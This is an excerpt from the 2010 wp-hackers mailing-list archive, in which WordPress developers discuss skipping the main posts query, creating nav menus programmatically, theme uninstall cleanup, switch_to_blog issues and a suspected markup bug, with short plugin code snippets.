> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    


From peter.westwood at ftwr.co.uk  Sat Jul 31 05:09:26 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Sat, 31 Jul 2010 06:09:26 +0100
Subject: [wp-hackers] Skip Main Query
In-Reply-To: <4C537CDC.7050100@voceconnect.com>
References: <BLU136-W3251F77E9581669EC5024F90AA0@phx.gbl>
	<4C537CDC.7050100@voceconnect.com>
Message-ID: <589DBEBE-AB8D-44A6-B567-F57E30058762@ftwr.co.uk>

On 31 Jul 2010, at 02:31, Michael Pretty <mpretty at voceconnect.com> wrote:

> If you don't need anything from the initial query, is there a reason you don't just take over earlier, like 'init'?  Most everything should be loaded at that point.
> 
> Michael Pretty
> prettyboymp
> 
> On 7/30/10 6:54 PM, Theodor Ramisch wrote:
>> Hi,
>> 
>> I'm writing a plugin which should display data from its own tables in XML. It does not rely on any posts.
>> 
>> To reach my plugin, I've added query_vars, the rewrite rules and listen on template_redirect for the parameters.
>> 
>> No I've noticed that WordPress still queries the posts from the start page. Is there a way to avoid that? Since I don't need the posts, I don't want to make that query.
>> 
>> Bypassing WP completely using mod_rewrite rules is not an option, since I need to have access to the database, permissions and so on.
>> 
>> 

There is a tick for a hook to allow For this as it would be nice fir buddypress too I'll have a look for it later today when I'm in trac

--
Peter Westwood
http://peter.westwood.name


From jayarjo at gmail.com  Sat Jul 31 05:51:28 2010
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sat, 31 Jul 2010 09:51:28 +0400
Subject: [wp-hackers] how can I use the create new menu function for
	making a default menu
In-Reply-To: <C424EA67-B1DA-4B5A-A216-B93CB921AAF8@newclarity.net>
References: <AANLkTimp-wgvQH9C8CHbef9YJboAXe7vc8NCE2iVWq8K@mail.gmail.com> 
	<C424EA67-B1DA-4B5A-A216-B93CB921AAF8@newclarity.net>
Message-ID: <AANLkTimbhcjdqp8MWzyrO8X-gXZb_2Ax0y=JWL-a9tAA@mail.gmail.com>

Great example, thanks! I will be using these too.

On Sat, Jul 31, 2010 at 4:44 AM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> Hi Jared:
>
> Do you mean these found in /wp-includes/nav-menu.php?
>
> Create Menu:
> ? ? ? ?$menu_id = wp_create_nav_menu( $menu_name );
>
> Create Menu Items:
> ? ? ? ?$menu = array(
> ? ? ? ? ? ? ? ?'menu-item-object-id' => 0,
> ? ? ? ? ? ? ? ?'menu-item-object' => '',
> ? ? ? ? ? ? ? ?'menu-item-parent-id' => 0,
> ? ? ? ? ? ? ? ?'menu-item-position' => 0,
> ? ? ? ? ? ? ? ?'menu-item-type' => 'custom',
> ? ? ? ? ? ? ? ?'menu-item-title' => '',
> ? ? ? ? ? ? ? ?'menu-item-url' => '',
> ? ? ? ? ? ? ? ?'menu-item-description' => '',
> ? ? ? ? ? ? ? ?'menu-item-attr-title' => '',
> ? ? ? ? ? ? ? ?'menu-item-target' => '',
> ? ? ? ? ? ? ? ?'menu-item-classes' => '',
> ? ? ? ? ? ? ? ?'menu-item-xfn' => '',
> ? ? ? ? ? ? ? ?'menu-item-status' => '',
> ? ? ? ?);
> ? ? ? ?$menu_item_db_id = wp_update_nav_menu_item( $menu_id, 0, $menu);
>
> Update Menu Items:
> ? ? ? ?wp_update_nav_menu_item( $menu_id, $menu_item_db_id, $menu);
>
> I've used them to create menus and menu items automatically.
>
> To understand the parameters create some menus in the admin and then take a look at the values created for different types of menu items in wp_postmeta.
>
> Hope this helps?
>
> -Mike
>
> On Jul 30, 2010, at 8:25 PM, Jared Williams wrote:
>
>> Hi,
>> I know the menu system needs lots of work still, but I was wondering if
>> anyone knows of a way to make use of whatever function(s) the 'Create Menu'
>> does when you make a new custom named menu in the dashboard to make a
>> pre-made menu to go along with a registered menu location etc. This would be
>> nice so that when a theme were installed that has registered menus in it,
>> the menu name you specify in the code would be created upon installing, and
>> deleted when uninstalling a theme.
>>
>> I've searched for some kind of solution to this, and have studied the code
>> in nav-menus.php and other files with 3.0 source code. This is just about
>> the only thing I am unable to figure out with 3.0, at least that I have
>> tried to do so far.
>> I figured here is probably the best place to ask such a question.
>>
>> Thanks,
>>
>> Jared Williams
>> New2WP.com
>>
>>
>> On Fri, Jul 30, 2010 at 11:33 AM,
>> <wp-hackers-request at lists.automattic.com>wrote:
>>
>>> Send wp-hackers mailing list submissions to
>>> ? ? ? wp-hackers at lists.automattic.com
>>>
>>> To subscribe or unsubscribe via the World Wide Web, visit
>>> ? ? ? http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> or, via email, send a message with subject or body 'help' to
>>> ? ? ? wp-hackers-request at lists.automattic.com
>>>
>>> You can reach the person managing the list at
>>> ? ? ? wp-hackers-owner at lists.automattic.com
>>>
>>> When replying, please edit your Subject line so it is more specific
>>> than "Re: Contents of wp-hackers digest..."
>>>
>>>
>>> Today's Topics:
>>>
>>> ?1. Re: any way to clean after theme when it gets deleted?
>>> ? ? (Davit Barbakadze)
>>> ?2. Re: any way to clean after theme when it gets deleted?
>>> ? ? (Ashish Saini)
>>> ?3. Re: any way to clean after theme when it gets deleted?
>>> ? ? (Andrew Nacin)
>>> ?4. Re: any way to clean after theme when it gets deleted?
>>> ? ? (Ashish Saini)
>>> ?5. Re: any way to clean after theme when it gets deleted?
>>> ? ? (Davit Barbakadze)
>>> ?6. Re: any way to clean after theme when it gets deleted?
>>> ? ? (Andrew Nacin)
>>> ?7. switch_to_blog in WP3 (Bill Dennen)
>>> ?8. Re: any way to clean after theme when it gets deleted?
>>> ? ? (esmi at quirm dot net)
>>>
>>>
>>> ----------------------------------------------------------------------
>>>
>>> Message: 1
>>> Date: Fri, 30 Jul 2010 17:17:51 +0400
>>> From: Davit Barbakadze <jayarjo at gmail.com>
>>> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>>> ? ? ? deleted?
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID:
>>> ? ? ? <AANLkTikhpSNdc-VtaLnOU2py=b+90tFjpCFLZeW+ecS6 at mail.gmail.com<b%2B90tFjpCFLZeW%2BecS6 at mail.gmail.com>
>>>>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>>
>>> It's not about switching (activate/deactivate), but deleting. It would
>>> be pretty logical to remove all the stuff that theme has created on
>>> activation.
>>>
>>> On Fri, Jul 30, 2010 at 3:45 PM, Ashish Saini
>>> <ashishsainiashfame at gmail.com> wrote:
>>>> Hi Davit,
>>>>
>>>> I think a better option would be to provide uninstall function as leaving
>>>> the options in the database makes sense as the user may switch back and
>>> so
>>>> it will save the pain of configuring it.
>>>>
>>>> Thanks & Regards
>>>> Ashish Saini aka Ashfame
>>>> (Deserve Before You Desire)
>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter
>>>> : http://twitter.com/ashfame
>>>>
>>>>
>>>> On Fri, Jul 30, 2010 at 4:44 PM, <diana.j.wiadji at hotmail.com> wrote:
>>>>
>>>>> $
>>>>> ------Original Message------
>>>>> From: Davit Barbakadze
>>>>> Sender: wp-hackers-bounces at lists.automattic.com
>>>>> To: wp-hackers at lists.automattic.com
>>>>> ReplyTo: wp-hackers at lists.automattic.com
>>>>> Subject: [wp-hackers] ?any way to clean after theme when it gets
>>> deleted?
>>>>> Sent: Jul 30, 2010 18:02
>>>>>
>>>>> I think everyone uses options and maybe even tables in their themes
>>>>> nowadays. Is there any way coder can clean up after theme - delete
>>>>> options, remove tables - when it get's uninstalled. Something similar
>>>>> to what we have for plugins?
>>>>>
>>>>> --
>>>>> Davit Barbakadze
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>
>>>>>
>>>>>
>>>>> Sent from my BlackBerry? smartphone on 3
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>
>>>
>>>
>>> --
>>> Davit Barbakadze
>>>
>>>
>>> ------------------------------
>>>
>>> Message: 2
>>> Date: Fri, 30 Jul 2010 18:55:18 +0530
>>> From: Ashish Saini <ashishsainiashfame at gmail.com>
>>> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>>> ? ? ? deleted?
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID:
>>> ? ? ? <AANLkTikU0qcxQMMVgRwTrNOEHjXoUO_o0r44C+=_96Z+ at mail.gmail.com<96Z%2B at mail.gmail.com>
>>>>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>>
>>> You didn't get my point. I said you should provide an uninstaller function
>>> that wipes out data and it shouldn't be automated upon deactivation.
>>>
>>> I would hate a theme which will ask for options to be configured again when
>>> I just switch back to another theme and now I want the previous theme back.
>>>
>>> Thanks & Regards
>>> Ashish Saini aka Ashfame
>>> (Deserve Before You Desire)
>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter
>>> : http://twitter.com/ashfame
>>>
>>>
>>> On Fri, Jul 30, 2010 at 6:47 PM, Davit Barbakadze <jayarjo at gmail.com>
>>> wrote:
>>>
>>>> It's not about switching (activate/deactivate), but deleting. It would
>>>> be pretty logical to remove all the stuff that theme has created on
>>>> activation.
>>>>
>>>> On Fri, Jul 30, 2010 at 3:45 PM, Ashish Saini
>>>> <ashishsainiashfame at gmail.com> wrote:
>>>>> Hi Davit,
>>>>>
>>>>> I think a better option would be to provide uninstall function as
>>> leaving
>>>>> the options in the database makes sense as the user may switch back and
>>>> so
>>>>> it will save the pain of configuring it.
>>>>>
>>>>> Thanks & Regards
>>>>> Ashish Saini aka Ashfame
>>>>> (Deserve Before You Desire)
>>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>>> Twitter
>>>>> : http://twitter.com/ashfame
>>>>>
>>>>>
>>>>> On Fri, Jul 30, 2010 at 4:44 PM, <diana.j.wiadji at hotmail.com> wrote:
>>>>>
>>>>>> $
>>>>>> ------Original Message------
>>>>>> From: Davit Barbakadze
>>>>>> Sender: wp-hackers-bounces at lists.automattic.com
>>>>>> To: wp-hackers at lists.automattic.com
>>>>>> ReplyTo: wp-hackers at lists.automattic.com
>>>>>> Subject: [wp-hackers] ?any way to clean after theme when it gets
>>>> deleted?
>>>>>> Sent: Jul 30, 2010 18:02
>>>>>>
>>>>>> I think everyone uses options and maybe even tables in their themes
>>>>>> nowadays. Is there any way coder can clean up after theme - delete
>>>>>> options, remove tables - when it get's uninstalled. Something similar
>>>>>> to what we have for plugins?
>>>>>>
>>>>>> --
>>>>>> Davit Barbakadze
>>>>>> _______________________________________________
>>>>>> wp-hackers mailing list
>>>>>> wp-hackers at lists.automattic.com
>>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>>
>>>>>>
>>>>>>
>>>>>> Sent from my BlackBerry? smartphone on 3
>>>>>> _______________________________________________
>>>>>> wp-hackers mailing list
>>>>>> wp-hackers at lists.automattic.com
>>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>>
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>
>>>>
>>>>
>>>>
>>>> --
>>>> Davit Barbakadze
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>
>>>
>>> ------------------------------
>>>
>>> Message: 3
>>> Date: Fri, 30 Jul 2010 09:45:12 -0400
>>> From: Andrew Nacin <wp at andrewnacin.com>
>>> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>>> ? ? ? deleted?
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID:
>>> ? ? ? <AANLkTi=ua3FWx5UJnGs9TpxYbqk_dN_GhW_bxbas01ON at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>>
>>> On Fri, Jul 30, 2010 at 9:25 AM, Ashish Saini
>>> <ashishsainiashfame at gmail.com>wrote:
>>>
>>>> You didn't get my point. I said you should provide an uninstaller
>>> function
>>>> that wipes out data and it shouldn't be automated upon deactivation.
>>>>
>>>
>>> Not sure you got his point -- I believe Davit is referring to the
>>> implementation of an uninstall hook for themes. He's pretty clear he'd want
>>> that triggered on deletion, not deactivation. Basically, how it works for
>>> plugins.
>>>
>>> I think implementing themes uninstall hooks would be a logical future step.
>>> We could start by removing items created using the theme_mod functions,
>>> which I don't think most themes use, but we use it for storing metadata for
>>> custom backgrounds and headers.
>>>
>>>
>>> ------------------------------
>>>
>>> Message: 4
>>> Date: Fri, 30 Jul 2010 19:48:22 +0530
>>> From: Ashish Saini <ashishsainiashfame at gmail.com>
>>> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>>> ? ? ? deleted?
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID:
>>> ? ? ? <AANLkTim7MQR2P6yOUa0j1TiPfWiaXDrVXfJM94Xovm-v at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>>
>>> Andrew, I knew that. I just replied back with a possible solution for his
>>> case.
>>>
>>> Thanks & Regards
>>> Ashish Saini aka Ashfame
>>> (Deserve Before You Desire)
>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter
>>> : http://twitter.com/ashfame
>>>
>>>
>>> On Fri, Jul 30, 2010 at 7:15 PM, Andrew Nacin <wp at andrewnacin.com> wrote:
>>>
>>>> On Fri, Jul 30, 2010 at 9:25 AM, Ashish Saini
>>>> <ashishsainiashfame at gmail.com>wrote:
>>>>
>>>>> You didn't get my point. I said you should provide an uninstaller
>>>> function
>>>>> that wipes out data and it shouldn't be automated upon deactivation.
>>>>>
>>>>
>>>> Not sure you got his point -- I believe Davit is referring to the
>>>> implementation of an uninstall hook for themes. He's pretty clear he'd
>>> want
>>>> that triggered on deletion, not deactivation. Basically, how it works for
>>>> plugins.
>>>>
>>>> I think implementing themes uninstall hooks would be a logical future
>>> step.
>>>> We could start by removing items created using the theme_mod functions,
>>>> which I don't think most themes use, but we use it for storing metadata
>>> for
>>>> custom backgrounds and headers.
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>
>>>
>>> ------------------------------
>>>
>>> Message: 5
>>> Date: Fri, 30 Jul 2010 18:32:12 +0400
>>> From: Davit Barbakadze <jayarjo at gmail.com>
>>> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>>> ? ? ? deleted?
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID:
>>> ? ? ? <AANLkTi=KdyyghUgN0-U46rkDThdGaYGmR1SH8c5F+w09 at mail.gmail.com<KdyyghUgN0-U46rkDThdGaYGmR1SH8c5F%2Bw09 at mail.gmail.com>
>>>>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>>
>>> theme_mod functions? what do they do?
>>>
>>> On Fri, Jul 30, 2010 at 5:45 PM, Andrew Nacin <wp at andrewnacin.com> wrote:
>>>> On Fri, Jul 30, 2010 at 9:25 AM, Ashish Saini
>>>> <ashishsainiashfame at gmail.com>wrote:
>>>>
>>>>> You didn't get my point. I said you should provide an uninstaller
>>> function
>>>>> that wipes out data and it shouldn't be automated upon deactivation.
>>>>>
>>>>
>>>> Not sure you got his point -- I believe Davit is referring to the
>>>> implementation of an uninstall hook for themes. He's pretty clear he'd
>>> want
>>>> that triggered on deletion, not deactivation. Basically, how it works for
>>>> plugins.
>>>>
>>>> I think implementing themes uninstall hooks would be a logical future
>>> step.
>>>> We could start by removing items created using the theme_mod functions,
>>>> which I don't think most themes use, but we use it for storing metadata
>>> for
>>>> custom backgrounds and headers.
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>
>>>
>>>
>>> --
>>> Davit Barbakadze
>>>
>>>
>>> ------------------------------
>>>
>>> Message: 6
>>> Date: Fri, 30 Jul 2010 10:38:48 -0400
>>> From: Andrew Nacin <wp at andrewnacin.com>
>>> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>>> ? ? ? deleted?
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID:
>>> ? ? ? <AANLkTinDDOQTQyaZdnmazoiGn6HSGXVW9eLkffXm0HZw at mail.gmail.com>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>>
>>> On Fri, Jul 30, 2010 at 10:32 AM, Davit Barbakadze <jayarjo at gmail.com
>>>> wrote:
>>>
>>>> theme_mod functions? what do they do?
>>>
>>>
>>> Rudimentary options storage for themes. Each theme's mods are stored in a
>>> single DB option row in the form of mod_{$theme}.
>>>
>>> Locations in core:
>>> ./wp-includes/theme.php:1270:function get_theme_mod($name, $default =
>>> false)
>>> {
>>> ./wp-includes/theme.php:1289:function set_theme_mod($name, $value) {
>>> ./wp-includes/theme.php:1311:function remove_theme_mod( $name ) {
>>> ./wp-includes/theme.php:1333:function remove_theme_mods() {
>>>
>>> Codex pages:
>>> http://codex.wordpress.org/Function_Reference/get_theme_mod
>>> http://codex.wordpress.org/Function_Reference/set_theme_mod
>>> http://codex.wordpress.org/Function_Reference/remove_theme_mod
>>> http://codex.wordpress.org/Function_Reference/remove_theme_mods
>>>
>>>
>>> ------------------------------
>>>
>>> Message: 7
>>> Date: Fri, 30 Jul 2010 11:29:11 -0400
>>> From: Bill Dennen <dennen at gmail.com>
>>> Subject: [wp-hackers] switch_to_blog in WP3
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID:
>>> ? ? ? <AANLkTimgcjBN35jVm7+Q_9CsGcuJJdhL9E-vjWTCLfe3 at mail.gmail.com<AANLkTimgcjBN35jVm7%2BQ_9CsGcuJJdhL9E-vjWTCLfe3 at mail.gmail.com>
>>>>
>>> Content-Type: text/plain; charset=ISO-8859-1
>>>
>>> Hi,
>>>
>>> I wrote a plugin that allows one blog to pull posts in from another
>>> blog via shortcode. I call it get-news. The syntax of the shortcode is
>>> something like this:
>>>
>>> [get-news site_name="news" numberposts="10" show_dates="0"]
>>>
>>> In short, what this code does is switch to the blog located at /news/
>>> and grab the 10 most recent posts and display them on the current
>>> blog. There are other options, as well - like pulling posts by
>>> category or tags, showing thumbnails, etc.
>>>
>>> My code uses switch_to_blog to do this. I've read that this function
>>> has a heavy performance hit. But, we've been using it with WP Super
>>> Cache and it has worked well for us in WPMU 2.9.2. Plus, at this
>>> point, my plugin is not meant for distribution -- it's used only on
>>> the site I manage. (That could change...)
>>>
>>> Now, my code is broken in WP3.x. Permalinks are incorrect and
>>> thumbnails do not work properly.
>>>
>>> I believe it's this bug, which is now listed as a "wontfix":
>>>
>>> http://core.trac.wordpress.org/ticket/12040
>>>
>>> In the bug report, there is mention that this bug could be 'fixed' via
>>> a plugin via the switch_blog hook.
>>>
>>> I'm looking for alternate suggestions for ways to do this. At this
>>> point, this bug is holding us back from going with WP3, which we'd
>>> like to do for many reasons!
>>>
>>> One option I toyed with initially was using RSS feeds, but I could not
>>> get the thumbnails over that way.
>>>
>>> Looking forward to any suggestions.
>>>
>>> Thanks-
>>> Bill
>>>
>>>
>>> ------------------------------
>>>
>>> Message: 8
>>> Date: Fri, 30 Jul 2010 16:33:08 +0100
>>> From: esmi at quirm dot net <esmi at quirm.net>
>>> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>>> ? ? ? deleted?
>>> To: wp-hackers at lists.automattic.com
>>> Message-ID: <4C52F0B4.4030908 at quirm.net>
>>> Content-Type: text/plain; charset=ISO-8859-1; format=flowed
>>>
>>> on 30/07/2010 15:38 Andrew Nacin said the following:
>>>> On Fri, Jul 30, 2010 at 10:32 AM, Davit Barbakadze <jayarjo at gmail.com
>>>> wrote:
>>>
>>>>> theme_mod functions? what do they do?
>>>
>>>> Rudimentary options storage for themes. Each theme's mods are stored in a
>>>> single DB option row in the form of mod_{$theme}.
>>>
>>> <snip>
>>>
>>> It's the multiple single rows in the db that I'm not keen on. Most of
>>> the time, I've been using a single row in the options table to store a
>>> serialized array. Each theme then has a manual "reset" option which
>>> removes all stored theme options but, thus far, I haven't found a way to
>>> trigger the reset on theme deletion.
>>>
>>> Mel / esmi
>>> --
>>> WordPress theme developer
>>> http://quirm.net
>>> http://blackwidows.co.uk
>>>
>>>
>>> ------------------------------
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>>
>>> End of wp-hackers Digest, Vol 66, Issue 120
>>> *******************************************
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From peter.westwood at ftwr.co.uk  Sat Jul 31 05:58:35 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Sat, 31 Jul 2010 06:58:35 +0100
Subject: [wp-hackers] Skip Main Query
In-Reply-To: <589DBEBE-AB8D-44A6-B567-F57E30058762@ftwr.co.uk>
References: <BLU136-W3251F77E9581669EC5024F90AA0@phx.gbl>
	<4C537CDC.7050100@voceconnect.com>
	<589DBEBE-AB8D-44A6-B567-F57E30058762@ftwr.co.uk>
Message-ID: <69303844-C49E-4517-AC80-DA2448AED75F@ftwr.co.uk>


On 31 Jul 2010, at 06:09, Peter Westwood wrote:

> On 31 Jul 2010, at 02:31, Michael Pretty <mpretty at voceconnect.com> wrote:
> 
>> If you don't need anything from the initial query, is there a reason you don't just take over earlier, like 'init'?  Most everything should be loaded at that point.
>> 
>> Michael Pretty
>> prettyboymp
>> 
>> On 7/30/10 6:54 PM, Theodor Ramisch wrote:
>>> Hi,
>>> 
>>> I'm writing a plugin which should display data from its own tables in XML. It does not rely on any posts.
>>> 
>>> To reach my plugin, I've added query_vars, the rewrite rules and listen on template_redirect for the parameters.
>>> 
>>> No I've noticed that WordPress still queries the posts from the start page. Is there a way to avoid that? Since I don't need the posts, I don't want to make that query.
>>> 
>>> Bypassing WP completely using mod_rewrite rules is not an option, since I need to have access to the database, permissions and so on.
>>> 
>>> 
> 
> There is a tick for a hook to allow For this as it would be nice fir buddypress too I'll have a look for it later today when I'm in trac
> 
> 

http://core.trac.wordpress.org/ticket/10886
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From angelia at 10sexyapples.com  Sat Jul 31 06:42:01 2010
From: angelia at 10sexyapples.com (Angelia Baladon)
Date: Fri, 30 Jul 2010 23:42:01 -0700
Subject: [wp-hackers] pre_get_posts problem
Message-ID: <AANLkTikTL-q76TTdddbE=wqbVvsD=MbiTda_GagatiY+@mail.gmail.com>

Hi all,
Well, I'm still at it trying to figure out what to do to get my custom post
types in the loop for my author.php file. Ironically, I think I'm beginning
to understand why everyone is using the pre_get_posts solution ... ? I got
this bit from Andrew ... thanks Andrew! but, unfortunately, I tested it and
it didn't return any results. Does anyone else have anything to add that
might help here? There are literally hundreds of sites out there
recommending the pre_get_posts solution to this, so, it anyone can help sort
this out, I'll be sure to go viral with the answer ... if only *sigh*. It's
over my head, so, all I can do is keep begging ;-)

Here's the code from Andrew:

<code>
function my_request_cpt_author( $query_vars ) {
   if ( is_author() )
      $query_vars['post_type'] = array( 'post', 'my_post_type' );
   return $query_vars;
}
add_filter( 'request', 'my_request_cpt_author' );
</code>

It's a whole new month, so, how 'bout it?

Angie

From mikeschinkel at newclarity.net  Sat Jul 31 01:43:02 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 30 Jul 2010 21:43:02 -0400
Subject: [wp-hackers] Unmatched </p> encountered? (/wp-admin/posts.php lines
	702 & 703)
Message-ID: <545C961E-30B4-4916-8410-8FDBBAEE0996@newclarity.net>

Has anyone else come across this error in v3.0.1?  Safari's inspector is reporting the following on both lines 702 and 703 of /wp-admin/posts.php.

"Unmatched </p> encountered?  Converting </p> into <p></p>." 

If others can confirm I'll submit a trac ticket...

-Mike


From mda at blogwaffe.com  Sat Jul 31 08:18:18 2010
From: mda at blogwaffe.com (Michael D Adams)
Date: Sat, 31 Jul 2010 01:18:18 -0700
Subject: [wp-hackers] Skip Main Query
In-Reply-To: <BLU136-W3251F77E9581669EC5024F90AA0@phx.gbl>
References: <BLU136-W3251F77E9581669EC5024F90AA0@phx.gbl>
Message-ID: <AANLkTikTvq4PMbDhXVRyEqBjP_G=WOyg=A6+kvugYpj5@mail.gmail.com>

On Fri, Jul 30, 2010 at 3:54 PM, Theodor Ramisch
<theodor_ramisch at hotmail.com> wrote:
> No I've noticed that WordPress still queries the posts from the start page. Is there a way to avoid that?

The following plugin works for me in WP 3.0.


/*
Plugin Name: Kill Front Page Query
*/

function kill_front_page_query() {
	add_filter( 'posts_request', 'kill_one_posts_request', 1000, 2 );
}

// apply_filters_ref_array() is a beautiful thing
function kill_one_posts_request( $sql, &$query ) {
	// The main query is running on the front page
	// And the currently running query is that main query
	if ( is_front_page() && $query->is_home &&
$GLOBALS['wp_the_query']->is_home ) {
		// We only want to do this once: remove the filter
		remove_filter( 'posts_request', 'kill_one_posts_request', 1000 );
		// Kill the FOUND_ROWS() query too
		$query->query_vars['no_found_rows'] = true;
		return ''; // Kill the query
	}
	return $sql;
}

add_filter( 'parse_request', 'kill_front_page_query' );


On the front page of a site with no fancy nav menu, I get one query
when viewing it logged out:

SELECT option_name, option_value FROM wp_options WHERE autoload = 'yes'

Mike
--mdawaffe

From peter.westwood at ftwr.co.uk  Sat Jul 31 08:24:41 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Sat, 31 Jul 2010 09:24:41 +0100
Subject: [wp-hackers] Unmatched </p> encountered? (/wp-admin/posts.php
	lines 702 & 703)
In-Reply-To: <545C961E-30B4-4916-8410-8FDBBAEE0996@newclarity.net>
References: <545C961E-30B4-4916-8410-8FDBBAEE0996@newclarity.net>
Message-ID: <2EC854AF-5E41-4A61-9D54-ACD4FBC73B7E@ftwr.co.uk>


On 31 Jul 2010, at 02:43, Mike Schinkel wrote:

> Has anyone else come across this error in v3.0.1?  Safari's inspector is reporting the following on both lines 702 and 703 of /wp-admin/posts.php.
> 
> "Unmatched </p> encountered?  Converting </p> into <p></p>." 
> 
> If others can confirm I'll submit a trac ticket...
> 

I just ran the current trunk version of that page through the w3c validator and all it complains about is "autocomplete"

I even tried creating a post with unmatched <p> and one with unmatched </p> and tried both normal and excerpt views and still couldn't reproduce.

So I guess this is a plugin causing this.

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From mda at blogwaffe.com  Sat Jul 31 08:28:07 2010
From: mda at blogwaffe.com (Michael D Adams)
Date: Sat, 31 Jul 2010 01:28:07 -0700
Subject: [wp-hackers] Unmatched </p> encountered? (/wp-admin/posts.php
	lines 702 & 703)
In-Reply-To: <2EC854AF-5E41-4A61-9D54-ACD4FBC73B7E@ftwr.co.uk>
References: <545C961E-30B4-4916-8410-8FDBBAEE0996@newclarity.net> 
	<2EC854AF-5E41-4A61-9D54-ACD4FBC73B7E@ftwr.co.uk>
Message-ID: <AANLkTimYJ-3rMHb3S=8eMXWYo_-msdCRNM24QTEKiTeq@mail.gmail.com>

On Sat, Jul 31, 2010 at 1:24 AM, Peter Westwood
<peter.westwood at ftwr.co.uk> wrote:
>
> On 31 Jul 2010, at 02:43, Mike Schinkel wrote:
>
>> Has anyone else come across this error in v3.0.1? ?Safari's inspector is reporting the following on both lines 702 and 703 of /wp-admin/posts.php.
>>
>> "Unmatched </p> encountered? ?Converting </p> into <p></p>."
>>
>> If others can confirm I'll submit a trac ticket...
>>
>
> I just ran the current trunk version of that page through the w3c validator and all it complains about is "autocomplete"

I didn't get that far.  I couldn't confirm because that file doesn't exist :)

http://core.trac.wordpress.org/browser/tags/3.0.1/wp-admin/posts.php

Mike
--mdawaffe

From peter.westwood at ftwr.co.uk  Sat Jul 31 08:29:57 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Sat, 31 Jul 2010 09:29:57 +0100
Subject: [wp-hackers] Unmatched </p> encountered? (/wp-admin/posts.php
	lines 702 & 703)
In-Reply-To: <AANLkTimYJ-3rMHb3S=8eMXWYo_-msdCRNM24QTEKiTeq@mail.gmail.com>
References: <545C961E-30B4-4916-8410-8FDBBAEE0996@newclarity.net>
	<2EC854AF-5E41-4A61-9D54-ACD4FBC73B7E@ftwr.co.uk>
	<AANLkTimYJ-3rMHb3S=8eMXWYo_-msdCRNM24QTEKiTeq@mail.gmail.com>
Message-ID: <56546C27-513F-4C08-A83E-83CAB84FA115@ftwr.co.uk>


On 31 Jul 2010, at 09:28, Michael D Adams wrote:

> On Sat, Jul 31, 2010 at 1:24 AM, Peter Westwood
> <peter.westwood at ftwr.co.uk> wrote:
>> 
>> On 31 Jul 2010, at 02:43, Mike Schinkel wrote:
>> 
>>> Has anyone else come across this error in v3.0.1?  Safari's inspector is reporting the following on both lines 702 and 703 of /wp-admin/posts.php.
>>> 
>>> "Unmatched </p> encountered?  Converting </p> into <p></p>."
>>> 
>>> If others can confirm I'll submit a trac ticket...
>>> 
>> 
